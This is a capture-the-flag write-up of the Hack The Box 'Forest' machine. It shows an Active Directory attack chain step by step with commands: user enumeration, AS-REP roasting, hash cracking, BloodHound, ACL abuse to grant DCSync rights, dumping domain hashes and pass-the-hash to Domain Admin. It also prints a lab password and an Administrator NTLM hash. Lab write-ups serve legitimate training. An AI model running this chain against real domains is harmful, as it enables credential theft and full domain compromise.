
# Hack The Box — Forest Writeup

## Machine Information

* **Name:** Forest
* **Difficulty:** Easy
* **OS:** Windows
* **Focus:** Active Directory Enumeration, AS-REP Roasting, BloodHound, ACL Abuse, DCSync

---

# 1. Initial Enumeration

## Nmap Scan

```bash
nmap -sC -sV -Pn 10.129.x.x
```

### Important Open Ports

```
53   DNS
88   Kerberos
135  RPC
139  SMB
389  LDAP
445  SMB
5985 WinRM
```

These ports indicate that the target is a **Domain Controller**.

---

# 2. SMB Enumeration

First we enumerate SMB:

```bash
enum4linux-ng 10.129.x.x
```

This reveals several domain users.

Another useful command:

```bash
rpcclient -U "" -N 10.129.x.x
```

Inside rpcclient:

```
enumdomusers
```

Now we have a list of domain usernames.

Example:

```
svc-alfresco
andy
lucinda
mark
```

---

# 3. AS-REP Roasting

Next we check if any users do not require Kerberos preauthentication.

```bash
GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip 10.129.x.x
```

We successfully retrieve a hash for:

```
svc-alfresco
```

Example hash:

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

---

# 4. Cracking the Hash

We crack the AS-REP hash using hashcat.

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
svc-alfresco : s3rvice
```

---

# 5. Access via WinRM

Now we can connect using Evil-WinRM.

```bash
evil-winrm -i 10.129.x.x -u svc-alfresco -p s3rvice
```

We now have a shell as:

```
svc-alfresco
```

---

# 6. BloodHound Enumeration

To understand privilege relationships in the domain we use BloodHound.

Upload SharpHound:

```powershell
upload SharpHound.exe
```

Run:

```powershell
.\SharpHound.exe -c All
```

Download the resulting zip file and import it into BloodHound.

---

# 7. Privilege Escalation via ACL Abuse

BloodHound shows that **svc-alfresco** has privileges over the group:

```
Exchange Windows Permissions
```

This allows modification of domain permissions.

We exploit this using PowerView.

Import PowerView:

```powershell
Import-Module .\PowerView.ps1
```

Add our user to the privileged group:

```powershell
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco
```

---

# 8. Grant DCSync Privileges

Now we give ourselves DCSync permissions.

```powershell
Add-DomainObjectAcl -TargetIdentity "HTB.LOCAL" -PrincipalIdentity svc-alfresco -Rights DCSync
```

---

# 9. Dumping Domain Hashes

Back on Kali we perform DCSync using secretsdump.

```bash
secretsdump.py htb.local/svc-alfresco:s3rvice@10.129.x.x
```

This dumps the NTLM hashes of domain users including **Administrator**.

Example:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

---

# 10. Pass-the-Hash

We can now authenticate as Administrator using the NTLM hash.

```bash
evil-winrm -i 10.129.x.x -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

---

# 11. Root Access

Check privileges:

```powershell
whoami
```

Output:

```
htb\administrator
```

We now have **Domain Administrator access**.

Retrieve the root flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

# Attack Chain Summary

```
Nmap Enumeration
↓
SMB User Enumeration
↓
AS-REP Roasting
↓
Hash Cracking
↓
WinRM Access (svc-alfresco)
↓
BloodHound Analysis
↓
ACL Abuse
↓
Grant DCSync
↓
Dump Domain Hashes
↓
Pass-the-Hash
↓
Administrator Shell
```

---

# Key Takeaways

* Always enumerate **Kerberos users for AS-REP roasting**
* **BloodHound** is essential for identifying AD privilege escalation paths
* ACL misconfigurations can lead to **DCSync attacks**
* DCSync allows dumping password hashes for all domain users

---

# Tools Used

* Nmap
* enum4linux-ng
* Impacket (GetNPUsers, secretsdump)
* Hashcat
* Evil-WinRM
* BloodHound
* PowerView
